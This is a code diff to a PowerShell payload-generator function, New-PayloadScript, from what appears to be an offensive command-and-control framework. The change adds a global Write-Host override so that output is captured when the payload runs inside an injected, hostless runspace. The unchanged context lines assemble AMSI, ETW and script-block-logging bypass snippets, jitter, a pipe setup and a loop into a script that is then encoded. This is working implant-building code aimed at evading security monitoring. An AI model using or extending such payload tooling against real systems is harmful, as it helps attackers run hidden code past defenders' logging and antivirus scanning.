@@ -169,6 +169,11 @@ function New-PayloadScript {
     $vCb=(&$rnd); $vGz=(&$rnd); $vA=(&$rnd); $vB=(&$rnd)
     $vC=(&$rnd); $vD=(&$rnd)
 
+    # In a CLR Runspace with no PSHost (InjectUnmanagedPS path), Write-Host silently discards
+    # output because there is no host UI to write to and the Information stream is never dispatched.
+    # Override Write-Host globally to redirect to Write-Output so *>&1|Out-String captures it.
+    $whOverride = "function global:Write-Host{param([Parameter(ValueFromPipeline=`$true,ValueFromRemainingArguments=`$true)][Object]`$Object,[switch]`$NoNewline,[System.ConsoleColor]`$ForegroundColor,[System.ConsoleColor]`$BackgroundColor,[string]`$Separator);if(`$null -ne `$Object){if(`$Object -is [array]){Write-Output(`$Object-join' ')}else{Write-Output `$Object}}}"
+
     $amsiSnippet = Get-AmsiBypassSnippet -Technique $Config.Amsi
     $etwSnippet  = Get-EtwBypassSnippet  -Technique $Config.Etw
     $sblSnippet  = if ($Config.Sbl) { Get-SblBypassSnippet } else { '' }
@@ -253,7 +258,7 @@ function New-PayloadScript {
         )
     }
 
-    $rawScript = "$keyBlock;$etwSnippet;$sblSnippet;$amsiSnippet;$jitter;$pipeSetup;$loop"
+    $rawScript = "$keyBlock;$etwSnippet;$sblSnippet;$amsiSnippet;$jitter;$whOverride;$pipeSetup;$loop"
 
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($rawScript)
     $ms    = [System.IO.MemoryStream]::new()
